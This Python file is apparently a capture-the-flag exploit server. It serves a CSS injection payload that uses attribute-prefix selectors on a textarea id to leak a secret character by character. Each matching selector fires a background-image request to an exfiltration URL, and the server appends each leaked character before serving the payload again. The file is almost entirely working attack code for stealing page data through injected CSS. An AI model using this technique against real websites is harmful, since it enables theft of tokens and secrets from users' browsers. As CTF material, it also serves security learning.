import http.server
import socketserver
from http import HTTPStatus

class Handler(http.server.SimpleHTTPRequestHandler):

    flag = "wack{styl1sh_3xpl0its_1s_c00l}"
    exfil_url =  "http://internal.hidden.xyz:8888/exfil/"

    def do_GET(self):
        if self.path == "/exfil.css":
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/css")
            self.end_headers()
            payload = ""
            for i in range(32, 127):
                # Skip quote, backslack and singlequote and backtick
                if i in [34, 39, 92, 96]:
                    continue
                # Generate payload
                payload += f"textarea[id^='{Handler.flag}{chr(i)}'] {{ background-image: url({self.exfil_url}{chr(i)}) }}\n"
            
            self.wfile.write(payload.encode())
        elif self.path.startswith("/exfil/"):
            lastChar = self.path[-1]
            Handler.flag += lastChar
            print(f"Got another char: {lastChar}, flag: {Handler.flag}")
            self.send_response(HTTPStatus.OK)
            self.end_headers()
            self.wfile.write(b'')
        else:    
            self.send_response(HTTPStatus.OK)
            self.end_headers()
            self.wfile.write(b'I never exfil anything i should not exfil')
    

def run_server():
    httpd = socketserver.TCPServer(('', 8000), Handler)
    try:
        print("Serving at port 8000")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server gracefully...")
        httpd.server_close()
        httpd.shutdown()
        print("Server closed.")


if __name__ == "__main__":
    run_server()